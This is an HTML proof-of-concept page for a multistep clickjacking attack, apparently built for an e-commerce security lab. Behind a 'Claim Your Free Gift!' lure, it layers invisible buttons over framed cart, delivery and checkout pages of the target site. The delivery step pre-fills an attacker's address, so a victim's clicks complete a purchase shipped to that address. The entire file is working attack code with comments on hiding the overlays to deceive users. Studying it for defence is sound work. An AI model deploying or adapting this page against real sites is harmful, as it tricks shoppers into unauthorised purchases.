<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multistep Clickjacking Demo</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .overlay {
            position: absolute;
            opacity: 0; /* Ẩn hoàn toàn để lừa người dùng */
            z-index: 10;
        }
        #overlay-cart {
            top: 300px; /* Căn chỉnh với nút 'Add to Cart' */
            left: 600px;
        }
        #overlay-delivery {
            top: 350px; /* Căn chỉnh với nút 'Submit Address' */
            left: 650px;
        }
        #overlay-checkout {
            top: 450px; /* Căn chỉnh với nút 'Confirm Purchase' */
            left: 650px;
        }
        iframe {
            width: 100%;
            height: 800px;
            border: none;
            display: none;
        }
        #iframe-cart {
            display: block; /* Hiển thị iframe đầu tiên */
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff4500;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #cc3700;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Free Gift!</h1>
        <p>Click the button below to get your exclusive offer!</p>
    </div>
    <iframe id="iframe-cart" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
    <iframe id="iframe-delivery" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
    <iframe id="iframe-checkout" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
    <div id="overlay-cart" class="overlay">
        <button onclick="nextStep('cart')">Add Free Item to Cart</button>
    </div>
    <div id="overlay-delivery" class="overlay" style="display: none;">
        <button onclick="nextStep('delivery')">Submit Your Claim</button>
    </div>
    <div id="overlay-checkout" class="overlay" style="display: none;">
        <button onclick="nextStep('checkout')">Confirm Your Free Gift</button>
    </div>
    <script>
        let currentStep = 'cart';

        function nextStep(step) {
            document.getElementById(`iframe-${step}`).style.display = 'none';
            document.getElementById(`overlay-${step}`).style.display = 'none';

            if (step === 'cart') {
                currentStep = 'delivery';
                document.getElementById('iframe-delivery').style.display = 'block';
                document.getElementById('overlay-delivery').style.display = 'block';
            } else if (step === 'delivery') {
                currentStep = 'checkout';
                document.getElementById('iframe-checkout').style.display = 'block';
                document.getElementById('overlay-checkout').style.display = 'block';
            } else if (step === 'checkout') {
                alert('You completed the clickjacking attack!');
            }
        }
    </script>
</body>
</html>
